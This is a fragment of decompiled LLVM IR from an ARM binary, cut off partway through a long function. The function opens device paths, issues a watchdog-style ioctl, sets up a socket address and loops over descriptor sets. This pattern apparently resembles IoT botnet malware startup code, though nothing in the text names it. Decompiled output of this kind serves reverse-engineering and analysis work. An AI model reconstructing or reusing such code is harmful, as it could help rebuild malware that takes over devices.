  %v3_de2c = call i32 @function_efe8(i32 3, i32* null)
  %v1_de30 = call i32 @function_eae0(i32 %v3_de2c)
  store i32 %v1_de30, i32* @r6, align 4
  %v1_de3c = call i32 @function_f00c(i32 3)
  %v0_de40 = load i32, i32* @r6, align 4
  %v2_de40 = icmp eq i32 %v0_de40, 0
  br i1 %v2_de40, label %dec_label_pc_de90, label %dec_label_pc_de48

dec_label_pc_de48:                                ; preds = %dec_label_pc_de18
  %v1_de48 = add i32 %v0_de40, 4
  %v2_de48 = inttoptr i32 %v1_de48 to i32*
  %v3_de48 = load i32, i32* %v2_de48, align 4
  store i32 %v3_de48, i32* @r4, align 4
  %v0_de4c = call i32 @function_e7dc()
  %v0_de50 = load i32, i32* @r6, align 4
  %v1_de50 = inttoptr i32 %v0_de50 to i8*
  %v2_de50 = load i8, i8* %v1_de50, align 1
  %v3_de50 = zext i8 %v2_de50 to i32
  %v2_de54 = call i32 @function_10028(i32 %v0_de4c, i32 %v3_de50)
  store i32 ptrtoint (i16** @global_var_2060c.99 to i32), i32* @r5, align 4
  %v0_de5c = load i32, i32* @r4, align 4
  %v4_de5c = mul nuw nsw i32 %v3_de50, 4
  %v5_de5c = add i32 %v0_de5c, %v4_de5c
  %v6_de5c = inttoptr i32 %v5_de5c to i32*
  %v7_de5c = load i32, i32* %v6_de5c, align 4
  %v0_de60 = load i32, i32* @r6, align 4
  store i32 %v7_de5c, i32* @global_var_20610.100, align 4
  %v1_de68 = call i32 @function_eab8(i32 %v0_de60)
  %v1_de70 = call i32 @function_f0ac(i32 4)
  %v3_de7c = call i32 @function_efe8(i32 4, i32* null)
  %v4_de7c = inttoptr i32 %v3_de7c to i16*
  %v3_de80 = load i16, i16* %v4_de7c, align 2
  store i16 %v3_de80, i16* bitcast (i32* @global_var_2060e.101 to i16*), align 4
  %v1_de8c = call i32 @function_f00c(i32 4)
  br label %dec_label_pc_de90

dec_label_pc_de90:                                ; preds = %dec_label_pc_de18, %dec_label_pc_de48
  %v1_de94 = phi i32 [ %v1_de3c, %dec_label_pc_de18 ], [ %v1_de8c, %dec_label_pc_de48 ]
  ret i32 %v1_de94

; uselistorder directives
  uselistorder label %dec_label_pc_de90, { 1, 0 }
}

define i32 @function_de9c(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_de9c:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-42 = alloca i16, align 2
  %stack_var_-240 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-476 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-1500 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-150 = alloca i32, align 4
  %stack_var_-182 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-220 = alloca i32, align 4
  %stack_var_-118 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v9_de9c = load i32, i32* @r6, align 4
  %v15_de9c = load i32, i32* @r8, align 4
  %v2_dea8 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_dea8, i32* @r4, align 4
  store i32 %arg1, i32* @sb, align 4
  store i32 %tmp, i32* @fp, align 4
  %v2_deb8 = call i32 @function_10e88(i32* nonnull %stack_var_-64)
  store i32 %v2_dea8, i32* @r0, align 4
  %v2_dec4 = call i32 @function_10e44(i32 %v2_dea8, i32 2)
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_ded4 = call i32 @function_105d0(i32 0, i32 %v2_dea8, i32 0)
  %v2_dee0 = call i32 @function_10e9c(i32 17, i32 1)
  %v2_deec = call i32 @function_10e9c(i32 5, i32 56476)
  %v3_def8 = call i32 @function_101e0(i32 ptrtoint ([14 x i8]* @global_var_15a10.104 to i32), i32 2)
  %v7_defc = icmp eq i32 %v3_def8, -1
  store i32 %v3_def8, i32* @r4, align 4
  br i1 %v7_defc, label %dec_label_pc_e0d8, label %dec_label_pc_df08

dec_label_pc_df08:                                ; preds = %dec_label_pc_e0d8, %dec_label_pc_de9c
  %v0_df1c = phi i32 [ %v3_e0e0, %dec_label_pc_e0d8 ], [ %v3_def8, %dec_label_pc_de9c ]
  store i32 1, i32* @r3, align 4
  %v2_df20 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_df20, i32* %r2.global-to-local, align 4
  store i32 1, i32* %stack_var_-52, align 4
  %v3_df28 = call i32 @function_1057c(i32 %v0_df1c, i32 -2147199228, i32 %v2_df20)
  %v0_df2c = load i32, i32* @r4, align 4
  %v1_df30 = call i32 @function_10608(i32 %v0_df2c)
  br label %dec_label_pc_df34

dec_label_pc_df34:                                ; preds = %dec_label_pc_e0d8, %dec_label_pc_df08
  %v1_df38 = call i32 @function_10338(i32 ptrtoint (i32* @global_var_159c0.19 to i32))
  %v1_df3c = call i32 @function_fbf8(i32 %v1_df38)
  store i32 ptrtoint (i16** @global_var_2060c.99 to i32), i32* @ip, align 4
  store i32 %v1_df3c, i32* @global_var_20600.75, align 4
  store i32 197803826, i32* @global_var_20610.100, align 4
  store i32 2, i32* @lr, align 4
  store i32 20480, i32* @r3, align 4
  store i16 20480, i16* bitcast (i32* @global_var_2060e.101 to i16*), align 4
  store i16 2, i16* bitcast (i16** @global_var_2060c.99 to i16*), align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15a64.110 to i32), i32* @r1, align 4
  store i32 18, i32* @r2, align 4
  %v2_df70 = ptrtoint i32* %stack_var_-118 to i32
  store i32 %v2_df70, i32* @r0, align 4
  %v0_df74 = load i32, i32* @fp, align 4
  %v1_df74 = inttoptr i32 %v0_df74 to i32*
  %v2_df74 = load i32, i32* %v1_df74, align 4
  store i32 %v2_df74, i32* @r8, align 4
  %v0_df78 = call i32 @function_10b30()
  %v2_df8c = ptrtoint i32* %stack_var_-220 to i32
  store i32 %v2_df8c, i32* @r4, align 4
  store i32 56500, i32* %stack_var_-220, align 4
  store i32 ptrtoint (i32* @global_var_15a60.122 to i32), i32* @lr, align 4
  %v13_df9c = ptrtoint i32* %stack_var_-188 to i32
  store i32 %v13_df9c, i32* %ip.global-to-local, align 4
  store i32 56476, i32* %r3.global-to-local, align 4
  store i32 56476, i32* %stack_var_-188, align 4
  store i32 56500, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_dfb0

dec_label_pc_dfb0:                                ; preds = %dec_label_pc_dfb0, %dec_label_pc_df34
  %v0_dfbc = phi i32 [ %v2_dfbc, %dec_label_pc_dfb0 ], [ 56500, %dec_label_pc_df34 ]
  %v0_dfb0 = phi i32 [ %v1_dfb4, %dec_label_pc_dfb0 ], [ 4, %dec_label_pc_df34 ]
  %v2_dfb0 = add i32 %v0_dfb0, %v2_df8c
  %v3_dfb0 = inttoptr i32 %v2_dfb0 to i32*
  %v4_dfb0 = load i32, i32* %v3_dfb0, align 4
  store i32 %v4_dfb0, i32* %r3.global-to-local, align 4
  %v1_dfb4 = add nuw nsw i32 %v0_dfb0, 4
  %v7_dfb8 = icmp eq i32 %v1_dfb4, 28
  %v2_dfbc = add i32 %v4_dfb0, %v0_dfbc
  store i32 %v2_dfbc, i32* %r2.global-to-local, align 4
  br i1 %v7_dfb8, label %dec_label_pc_dfc4, label %dec_label_pc_dfb0

dec_label_pc_dfc4:                                ; preds = %dec_label_pc_dfb0
  %v2_dfc4 = icmp eq i32 %v2_dfbc, 0
  br i1 %v2_dfc4, label %dec_label_pc_dfcc, label %dec_label_pc_e0f4

dec_label_pc_dfcc:                                ; preds = %dec_label_pc_dfc4, %dec_label_pc_e0f4, %dec_label_pc_e1dc
  %v0_dfcc = phi i32 [ ptrtoint (i32* @global_var_f00c.117 to i32), %dec_label_pc_dfc4 ], [ %v2_e1d0, %dec_label_pc_e0f4 ], [ %v1_e1e0, %dec_label_pc_e1dc ]
  %v1_dfcc = call i32 @function_dcb4(i32 %v0_dfcc)
  %v1_dfd0 = call i32 @function_e838(i32 %v1_dfcc)
  %v2_dfd8 = ptrtoint i32* %stack_var_-182 to i32
  %v2_dfe0 = call i32 @function_f9d0(i32 %v2_dfd8, i32 32)
  %v0_dfe4 = load i32, i32* @sb, align 4
  %v7_dfe4 = icmp eq i32 %v0_dfe4, 2
  br i1 %v7_dfe4, label %dec_label_pc_e754, label %dec_label_pc_dfec

dec_label_pc_dfec:                                ; preds = %dec_label_pc_e754, %dec_label_pc_dfcc, %dec_label_pc_e764
  %v0_dfec = call i32 @function_e7dc()
  %v1_dff0 = mul i32 %v0_dfec, 4
  %v3_dff4 = and i32 %v1_dff0, 12
  %v2_dffc = ptrtoint i32* %stack_var_-150 to i32
  store i32 %v2_dffc, i32* @r5, align 4
  %v1_e000 = add nuw nsw i32 %v3_dff4, 12
  store i32 %v1_e000, i32* @r4, align 4
  %v2_e00c = bitcast i32* %stack_var_-150 to i8*
  %v3_e00c = call i32 @function_e8a0(i8* %v2_e00c, i32 %v1_e000)
  %v2_e014 = ptrtoint i32* %stack_var_-40 to i32
  %v1_e018 = load i32, i32* @r4, align 4
  %v2_e018 = add i32 %v1_e018, %v2_e014
  store i32 %v2_e018, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  %v0_e024 = load i32, i32* @fp, align 4
  %v1_e024 = inttoptr i32 %v0_e024 to i32*
  %v2_e024 = load i32, i32* %v1_e024, align 4
  store i32 %v2_e024, i32* @r0, align 4
  %v3_e028 = add i32 %v2_e018, -110
  %v4_e028 = inttoptr i32 %v3_e028 to i8*
  store i8 0, i8* %v4_e028, align 1
  %v2_e02c = inttoptr i32 %v2_e024 to i8*
  %v3_e02c = call i32 @function_f964(i8* %v2_e02c, i32 %v2_dffc)
  %v0_e030 = call i32 @function_e7dc()
  %v3_e03c = udiv i32 %v0_e030, 6
  store i32 %v3_e03c, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r3, align 4
  %v3_e04c = mul i32 %v0_e030, 4
  %v1_e050 = add i32 %v3_e04c, 12
  store i32 %v1_e050, i32* @r4, align 4
  %v3_e05c = call i32 @function_e8a0(i8* %v2_e00c, i32 %v1_e050)
  store i32 %v2_e014, i32* @lr, align 4
  %v1_e068 = load i32, i32* @r4, align 4
  %v2_e068 = add i32 %v1_e068, %v2_e014
  store i32 %v2_e068, i32* %r3.global-to-local, align 4
  %v0_e06c = load i32, i32* @r6, align 4
  %v1_e06c = trunc i32 %v0_e06c to i8
  %v3_e06c = add i32 %v2_e068, -110
  %v4_e06c = inttoptr i32 %v3_e06c to i8*
  store i8 %v1_e06c, i8* %v4_e06c, align 1
  %v2_e078 = call i32 @function_10284(i32 15, i32 %v2_dffc)
  %v1_e080 = call i32 @function_f0ac(i32 2)
  %v3_e08c = call i32 @function_efe8(i32 2, i32* nonnull %stack_var_-48)
  %v3_e090 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_e090, i32* %r2.global-to-local, align 4
  %v2_e09c = call i32 @function_10514(i32 1, i32 %v3_e08c)
  store i32 1, i32* %r2.global-to-local, align 4
  %v2_e0ac = call i32 @function_10514(i32 1, i32 ptrtoint (i32* @global_var_15a34.125 to i32))
  %v1_e0b4 = call i32 @function_f00c(i32 2)
  store i32 %v1_e0b4, i32* @r0, align 4
  %v0_e0b8 = call i32 @function_102c4()
  %v1_e0bc = load i32, i32* @r6, align 4
  %v7_e0c0 = icmp sgt i32 %v0_e0b8, %v1_e0bc
  br i1 %v7_e0c0, label %dec_label_pc_e0c4, label %dec_label_pc_e1e8

dec_label_pc_e0c4:                                ; preds = %dec_label_pc_dfec
  store i32 %v9_de9c, i32* %r6.global-to-local, align 4
  store i32 %v15_de9c, i32* %r8.global-to-local, align 4
  ret i32 %v1_e0bc

dec_label_pc_e0d8:                                ; preds = %dec_label_pc_de9c
  %v3_e0e0 = call i32 @function_101e0(i32 ptrtoint ([19 x i8]* @global_var_15a20.127 to i32), i32 2)
  %v3_e0e4 = icmp eq i32 %v3_e0e0, -1
  store i32 %v3_e0e0, i32* @r4, align 4
  br i1 %v3_e0e4, label %dec_label_pc_df34, label %dec_label_pc_df08

dec_label_pc_e0f4:                                ; preds = %dec_label_pc_dfc4
  %v2_e0f8 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_e0f8, i32* @sl, align 4
  store i32 0, i32* @r4, align 4
  store i32 %v2_e0f8, i32* %r6.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 175, i32* @r7, align 4
  %v2_e110 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_e110, i32* %r3.global-to-local, align 4
  %v1_e118 = add i32 %v2_e110, -78
  %v2_e118 = inttoptr i32 %v1_e118 to i8*
  %v3_e118 = load i8, i8* %v2_e118, align 2
  %v1_e11c = add i32 %v2_e110, -77
  %v2_e11c = inttoptr i32 %v1_e11c to i8*
  %v3_e11c = load i8, i8* %v2_e11c, align 1
  %v4_e11c = zext i8 %v3_e11c to i32
  store i32 %v4_e11c, i32* %r2.global-to-local, align 4
  %v0_e120 = load i32, i32* @r8, align 4
  %v5_e124 = bitcast i32* %stack_var_-84 to i8*
  store i8 %v3_e11c, i8* %v5_e124, align 4
  %v3_e128 = or i32 %v2_e0f8, 1
  %v4_e128 = inttoptr i32 %v3_e128 to i8*
  store i8 %v3_e118, i8* %v4_e128, align 1
  %v0_e12c = load i32, i32* %ip.global-to-local, align 4
  %v1_e12c = add i32 %v0_e12c, 2
  store i32 %v1_e12c, i32* @r5, align 4
  %v1_e130 = inttoptr i32 %v0_e120 to i8*
  %v2_e130 = call i32 @function_f93c(i8* %v1_e130)
  %v0_e138 = load i32, i32* @r5, align 4
  %v2_e13c = call i32 @function_1016c(i32 %v0_e138, i32 %v2_e130)
  %v0_e140 = load i32, i32* @r8, align 4
  %v2_e140 = add i32 %v0_e140, %v2_e130
  %v3_e140 = inttoptr i32 %v2_e140 to i8*
  %v4_e140 = load i8, i8* %v3_e140, align 1
  %v6_e140 = zext i8 %v4_e140 to i32
  %v1_e14c = sub nuw nsw i32 -1, %v6_e140
  %v0_e154 = load i32, i32* @r7, align 4
  %v2_e154 = add i32 %v0_e154, %v1_e14c
  %v1_e15c = urem i32 %v2_e154, 256
  store i32 %v1_e15c, i32* @r7, align 4
  %v0_e164 = load i32, i32* %r6.global-to-local, align 4
  %v1_e164 = add i32 %v0_e164, 2
  store i32 %v1_e164, i32* @r6, align 4
  %v3_e178 = udiv i32 %v1_e15c, 9
  store i32 %v3_e178, i32* %r2.global-to-local, align 4
  %v2_e180.neg = sub i32 %v2_e154, %v3_e178
  %v1_e188 = mul i32 %v2_e180.neg, 4
  %v3_e194 = and i32 %v1_e188, 1020
  %v2_e198 = add i32 %v3_e194, %v2_e110
  store i32 %v2_e198, i32* %r3.global-to-local, align 4
  %v1_e19c = add i32 %v2_e198, -180
  %v2_e19c = inttoptr i32 %v1_e19c to i32*
  %v3_e19c = load i32, i32* %v2_e19c, align 4
  store i32 %v3_e19c, i32* %ip.global-to-local, align 4
  store i32 57768, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_e19c)
  %v0_e1ac = load i32, i32* @r8, align 4
  %v2_e1b0 = inttoptr i32 %v0_e1ac to i8*
  %v3_e1b0 = call i32 @function_fd1c(i8* %v2_e1b0, i32 %v2_e0f8)
  store i32 %v3_e1b0, i32* @r4, align 4
  %v2_e1c4 = call i32 @function_f9d0(i32 %v2_df70, i32 18)
  %v0_e1cc = load i32, i32* @r5, align 4
  %v2_e1d0 = call i32 @function_f9d0(i32 %v2_e0f8, i32 %v0_e1cc)
  %v0_e1d4 = load i32, i32* @r4, align 4
  %v2_e1d4 = icmp eq i32 %v0_e1d4, 0
  br i1 %v2_e1d4, label %dec_label_pc_dfcc, label %dec_label_pc_e1dc

dec_label_pc_e1dc:                                ; preds = %dec_label_pc_e0f4
  %v1_e1e0 = call i32 @function_10e28(i32 5)
  br label %dec_label_pc_dfcc

dec_label_pc_e1e8:                                ; preds = %dec_label_pc_dfec
  %v1_e1e8 = call i32 @function_10548(i32 %v0_e0b8)
  %v0_e1ec = load i32, i32* @r6, align 4
  %v1_e1f0 = call i32 @function_10608(i32 %v0_e1ec)
  %v1_e1f8 = call i32 @function_10608(i32 1)
  %v1_e200 = call i32 @function_10608(i32 2)
  %v1_e204 = call i32 @function_a370(i32 %v1_e200)
  %v1_e208 = call i32 @function_d550(i32 %v1_e204)
  %v2_e210 = ptrtoint i32* %stack_var_-1500 to i32
  %v0_e214 = load i32, i32* @r6, align 4
  store i32 %v0_e214, i32* @fp, align 4
  store i32 123880, i32* @sb, align 4
  store i32 123884, i32* @sl, align 4
  %v2_e22c = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_e22c, i32* @r6, align 4
  %v2_e230 = ptrtoint i32* %stack_var_-476 to i32
  store i32 %v2_e230, i32* @r7, align 4
  %v2_e310 = ptrtoint i32* %stack_var_-72 to i32
  %v2_e358 = ptrtoint i32* %stack_var_-240 to i32
  %v2_e670 = ptrtoint i16* %stack_var_-42 to i32
  %v2_e600 = ptrtoint i32* %stack_var_-52 to i32
  %v2_e604 = ptrtoint i32* %stack_var_-56 to i32
  %v1_e6c0 = bitcast i32* %stack_var_-182 to i8*
  %v2_e570 = ptrtoint i32* %stack_var_-100 to i32
  br label %dec_label_pc_e234

dec_label_pc_e234:                                ; preds = %dec_label_pc_e684, %dec_label_pc_e6b8, %bb78, %dec_label_pc_e504, %dec_label_pc_e448, %dec_label_pc_e438, %bb75, %dec_label_pc_e724, %dec_label_pc_e70c, %dec_label_pc_e694, %dec_label_pc_e62c, %dec_label_pc_e558, %dec_label_pc_e3ec, %dec_label_pc_e1e8
  store i32 0, i32* %stack_var_-348, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e240

dec_label_pc_e240:                                ; preds = %dec_label_pc_e240, %dec_label_pc_e234
  %v1_e244 = phi i32 [ %v1_e248, %dec_label_pc_e240 ], [ 4, %dec_label_pc_e234 ]
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_e244 = load i32, i32* @r6, align 4
  %v3_e244 = add i32 %v2_e244, %v1_e244
  %v4_e244 = inttoptr i32 %v3_e244 to i32*
  store i32 0, i32* %v4_e244, align 4
  %v0_e248 = load i32, i32* %r3.global-to-local, align 4
  %v1_e248 = add i32 %v0_e248, 4
  store i32 %v1_e248, i32* %r3.global-to-local, align 4
  %v7_e24c = icmp eq i32 %v1_e248, 128
  br i1 %v7_e24c, label %dec_label_pc_e254, label %dec_label_pc_e240

dec_label_pc_e254:                                ; preds = %dec_label_pc_e240
  %v0_e254 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_e254, i32* %stack_var_-476, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e25c

dec_label_pc_e25c:                                ; preds = %dec_label_pc_e25c, %dec_label_pc_e254
  %v1_e260 = phi i32 [ %v1_e264, %dec_label_pc_e25c ], [ 4, %dec_label_pc_e254 ]
  store i32 0, i32* @r4, align 4
  %v2_e260 = load i32, i32* @r7, align 4
  %v3_e260 = add i32 %v2_e260, %v1_e260
  %v4_e260 = inttoptr i32 %v3_e260 to i32*
  store i32 0, i32* %v4_e260, align 4
  %v0_e264 = load i32, i32* %r3.global-to-local, align 4
  %v1_e264 = add i32 %v0_e264, 4
  store i32 %v1_e264, i32* %r3.global-to-local, align 4
  %v7_e268 = icmp eq i32 %v1_e264, 128
  br i1 %v7_e268, label %dec_label_pc_e270, label %dec_label_pc_e25c

dec_label_pc_e270:                                ; preds = %dec_label_pc_e25c
  %v0_e270 = load i32, i32* @sb, align 4
  %v1_e270 = inttoptr i32 %v0_e270 to i32*
  %v2_e270 = load i32, i32* %v1_e270, align 4
  %v7_e274 = icmp eq i32 %v2_e270, -1
  br i1 %v7_e274, label %dec_label_pc_e2a4, label %dec_label_pc_e27c

dec_label_pc_e27c:                                ; preds = %dec_label_pc_e270
  %v3_e27c = udiv i32 %v2_e270, 32
  store i32 %v2_e014, i32* %r2.global-to-local, align 4
  %v3_e288 = mul nuw nsw i32 %v3_e27c, 4
  %v2_e28c = add i32 %v3_e288, %v2_e014
  store i32 %v2_e28c, i32* %r3.global-to-local, align 4
  %v1_e290 = add i32 %v2_e28c, -308
  %v2_e290 = inttoptr i32 %v1_e290 to i32*
  %v3_e290 = load i32, i32* %v2_e290, align 4
  %v1_e294 = urem i32 %v2_e270, 32
  %v7_e29c = shl i32 1, %v1_e294
  %v8_e29c = or i32 %v3_e290, %v7_e29c
  store i32 %v8_e29c, i32* %r2.global-to-local, align 4
  store i32 %v8_e29c, i32* %v2_e290, align 4
  br label %dec_label_pc_e2a4

dec_label_pc_e2a4:                                ; preds = %dec_label_pc_e270, %dec_label_pc_e27c
  %v0_e2a4 = load i32, i32* @sl, align 4
  %v1_e2a4 = inttoptr i32 %v0_e2a4 to i32*
  %v2_e2a4 = load i32, i32* %v1_e2a4, align 4
  store i32 %v2_e2a4, i32* @r3, align 4
  %v7_e2a8 = icmp eq i32 %v2_e2a4, -1
  store i32 123884, i32* %r8.global-to-local, align 4
  br i1 %v7_e2a8, label %dec_label_pc_e584, label %dec_label_pc_e2b4

dec_label_pc_e2b4:                                ; preds = %dec_label_pc_e584, %dec_label_pc_e2a4, %bb77
  %v2_e2b8 = load i8, i8* bitcast (i8** @global_var_1e5bc.132 to i8*), align 4
  %v3_e2b8 = zext i8 %v2_e2b8 to i32
  store i32 %v3_e2b8, i32* %r3.global-to-local, align 4
  %v2_e2bc = icmp eq i8 %v2_e2b8, 0
  %v0_e408 = load i32, i32* @sl, align 4
  %v1_e408 = inttoptr i32 %v0_e408 to i32*
  %v2_e408 = load i32, i32* %v1_e408, align 4
  store i32 %v2_e408, i32* %ip.global-to-local, align 4
  %v3_e410 = udiv i32 %v2_e408, 32
  br i1 %v2_e2bc, label %dec_label_pc_e408, label %dec_label_pc_e2c4

dec_label_pc_e2c4:                                ; preds = %dec_label_pc_e2b4
  store i32 %v2_e014, i32* %r2.global-to-local, align 4
  %v3_e2d4 = mul nuw nsw i32 %v3_e410, 4
  %v2_e2d8 = add i32 %v3_e2d4, %v2_e014
  store i32 %v2_e2d8, i32* %r3.global-to-local, align 4
  %v1_e2dc = add i32 %v2_e2d8, -436
  %v2_e2dc = inttoptr i32 %v1_e2dc to i32*
  %v3_e2dc = load i32, i32* %v2_e2dc, align 4
  %v1_e2e0 = urem i32 %v2_e408, 32
  %v7_e2e8 = shl i32 1, %v1_e2e0
  %v8_e2e8 = or i32 %v3_e2dc, %v7_e2e8
  store i32 %v8_e2e8, i32* %r2.global-to-local, align 4
  store i32 %v8_e2e8, i32* %v2_e2dc, align 4
  br label %dec_label_pc_e2f0

dec_label_pc_e2f0:                                ; preds = %dec_label_pc_e408, %dec_label_pc_e2c4
  %v0_e2f0 = load i32, i32* @sb, align 4
  %v1_e2f0 = inttoptr i32 %v0_e2f0 to i32*
  %v2_e2f0 = load i32, i32* %v1_e2f0, align 4
  %v0_e2f4 = load i32, i32* %ip.global-to-local, align 4
  %v5_e2f8 = icmp slt i32 %v0_e2f4, %v2_e2f0
  br i1 %v5_e2f8, label %bb75, label %bb

bb:                                               ; preds = %dec_label_pc_e2f0
  br label %bb75

bb75:                                             ; preds = %dec_label_pc_e2f0, %bb
  %v0_e314 = phi i32 [ %v2_e2f0, %dec_label_pc_e2f0 ], [ %v0_e2f4, %bb ]
  store i32 10, i32* %stack_var_-72, align 4
  store i32 %v2_e310, i32* %ip.global-to-local, align 4
  %v1_e314 = add i32 %v0_e314, 1
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_e230, i32* %r2.global-to-local, align 4
  %v5_e32c = call i32 @function_102f8(i32 %v1_e314, i32 %v2_e22c, i32 %v2_e230, i32 0, i32 %v2_e310)
  %v8_e330 = icmp eq i32 %v5_e32c, -1
  br i1 %v8_e330, label %dec_label_pc_e234, label %dec_label_pc_e338

dec_label_pc_e338:                                ; preds = %bb75
  %v6_e32c = trunc i32 %v5_e32c to i16
  %v3_e338 = icmp eq i16 %v6_e32c, 0
  br i1 %v3_e338, label %dec_label_pc_e340, label %dec_label_pc_e36c

dec_label_pc_e340:                                ; preds = %dec_label_pc_e338
  %v2_e344 = load i32, i32* @fp, align 4
  %v5_e348 = srem i32 %v2_e344, 6
  %v4_e350 = sub i32 %v2_e344, %v5_e348
  store i32 %v4_e350, i32* %r3.global-to-local, align 4
  store i32 %v5_e348, i32* %r2.global-to-local, align 4
  %v2_e35c = icmp eq i32 %v5_e348, 0
  store i16 0, i16* %stack_var_-42, align 2
  %v1_e364 = add i32 %v2_e344, 1
  store i32 %v1_e364, i32* @fp, align 4
  br i1 %v2_e35c, label %dec_label_pc_e668, label %dec_label_pc_e36c

dec_label_pc_e36c:                                ; preds = %dec_label_pc_e338, %dec_label_pc_e340, %dec_label_pc_e668
  %v0_e36c = load i32, i32* @sb, align 4
  %v1_e36c = inttoptr i32 %v0_e36c to i32*
  %v2_e36c = load i32, i32* %v1_e36c, align 4
  %v7_e370 = icmp eq i32 %v2_e36c, -1
  br i1 %v7_e370, label %dec_label_pc_e3a0, label %dec_label_pc_e378

dec_label_pc_e378:                                ; preds = %dec_label_pc_e36c
  %v3_e378 = udiv i32 %v2_e36c, 32
  store i32 %v2_e014, i32* %r2.global-to-local, align 4
  %v3_e384 = mul nuw nsw i32 %v3_e378, 4
  %v2_e388 = add i32 %v3_e384, %v2_e014
  store i32 %v2_e388, i32* %r3.global-to-local, align 4
  %v1_e38c = add i32 %v2_e388, -308
  %v2_e38c = inttoptr i32 %v1_e38c to i32*
  %v3_e38c = load i32, i32* %v2_e38c, align 4
  %v1_e390 = urem i32 %v2_e36c, 32
  %v6_e394 = lshr i32 %v3_e38c, %v1_e390
  store i32 %v6_e394, i32* %r2.global-to-local, align 4
  %v1_e398 = urem i32 %v6_e394, 2
  %v2_e398 = icmp eq i32 %v1_e398, 0
  br i1 %v2_e398, label %dec_label_pc_e3a0, label %dec_label_pc_e564

dec_label_pc_e3a0:                                ; preds = %dec_label_pc_e378, %dec_label_pc_e36c, %dec_label_pc_e564
  store i32 ptrtoint (i8** @global_var_1e5bc.132 to i32), i32* %r3.global-to-local, align 4
  %v2_e3a4 = load i8, i8* bitcast (i8** @global_var_1e5bc.132 to i8*), align 4
  %v3_e3a4 = zext i8 %v2_e3a4 to i32
  store i32 %v3_e3a4, i32* @r4, align 4
  %v2_e3a8 = icmp eq i8 %v2_e3a4, 0
  %v0_e438 = load i32, i32* @sl, align 4
  %v1_e438 = inttoptr i32 %v0_e438 to i32*
  %v2_e438 = load i32, i32* %v1_e438, align 4
  br i1 %v2_e3a8, label %dec_label_pc_e438, label %dec_label_pc_e3b0

dec_label_pc_e3b0:                                ; preds = %dec_label_pc_e3a0
  %v3_e3b8 = udiv i32 %v2_e438, 32
  store i32 %v2_e014, i32* %ip.global-to-local, align 4
  %v3_e3c0 = mul nuw nsw i32 %v3_e3b8, 4
  %v2_e3c4 = add i32 %v3_e3c0, %v2_e014
  store i32 %v2_e3c4, i32* %r3.global-to-local, align 4
  %v1_e3c8 = add i32 %v2_e3c4, -436
  %v2_e3c8 = inttoptr i32 %v1_e3c8 to i32*
  %v3_e3c8 = load i32, i32* %v2_e3c8, align 4
  %v1_e3cc = urem i32 %v2_e438, 32
  %v6_e3d0 = lshr i32 %v3_e3c8, %v1_e3cc
  store i32 %v6_e3d0, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_1e5bc.132 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_e3dc = urem i32 %v6_e3d0, 2
  %v2_e3dc = icmp eq i32 %v1_e3dc, 0
  store i8 0, i8* bitcast (i8** @global_var_1e5bc.132 to i8*), align 4
  store i32 123884, i32* @r4, align 4
  br i1 %v2_e3dc, label %dec_label_pc_e3ec, label %dec_label_pc_e5f4

dec_label_pc_e3ec:                                ; preds = %dec_label_pc_e3b0
  store i32 58356, i32* @lr, align 4
  %v1_e3f0 = icmp ne i32 %v2_e438, -1
  call void @__pseudo_cond_branch(i1 %v1_e3f0, i32 ptrtoint (i32* @global_var_10608.22 to i32))
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_e3f8 = load i32, i32* @r4, align 4
  %v2_e3f8 = inttoptr i32 %v1_e3f8 to i32*
  store i32 -1, i32* %v2_e3f8, align 4
  %v1_e400 = call i32 @function_126fc(i32 1)
  br label %dec_label_pc_e234

dec_label_pc_e408:                                ; preds = %dec_label_pc_e2b4
  %v3_e414 = mul nuw nsw i32 %v3_e410, 4
  %v2_e41c = add i32 %v3_e414, %v2_e014
  store i32 %v2_e41c, i32* %r3.global-to-local, align 4
  %v1_e420 = add i32 %v2_e41c, -308
  %v2_e420 = inttoptr i32 %v1_e420 to i32*
  %v3_e420 = load i32, i32* %v2_e420, align 4
  %v1_e424 = urem i32 %v2_e408, 32
  %v7_e42c = shl i32 1, %v1_e424
  %v8_e42c = or i32 %v3_e420, %v7_e42c
  store i32 %v8_e42c, i32* %r2.global-to-local, align 4
  store i32 %v8_e42c, i32* %v2_e420, align 4
  br label %dec_label_pc_e2f0

dec_label_pc_e438:                                ; preds = %dec_label_pc_e3a0
  %v7_e43c = icmp eq i32 %v2_e438, -1
  store i32 123884, i32* @r5, align 4
  br i1 %v7_e43c, label %dec_label_pc_e234, label %dec_label_pc_e448

